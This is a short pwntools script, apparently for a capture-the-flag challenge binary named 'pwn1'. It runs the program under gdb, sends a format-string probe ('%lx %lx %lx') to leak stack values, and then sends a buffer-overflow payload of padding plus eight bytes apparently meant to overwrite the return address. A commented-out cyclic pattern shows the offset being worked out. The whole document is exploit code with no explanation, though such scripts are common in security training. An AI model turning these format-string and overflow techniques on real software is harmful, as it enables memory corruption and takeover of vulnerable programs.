from pwn import *

context.arch = "amd64"
print(ELF("./pwn1"))

p = process("./pwn1")
dbg = gdb.attach(p)

p.recvuntil("Enter your witch name:\n")
p.sendline("%lx %lx %lx")
p.recvuntil("enter your magic spell:\n")
p.sendline("Expelliarmus\x00" + "A" * 251 + "B" * 8)
# p.sendline(b"Expelliarmus\x00" + cyclic(256))

p.interactive()
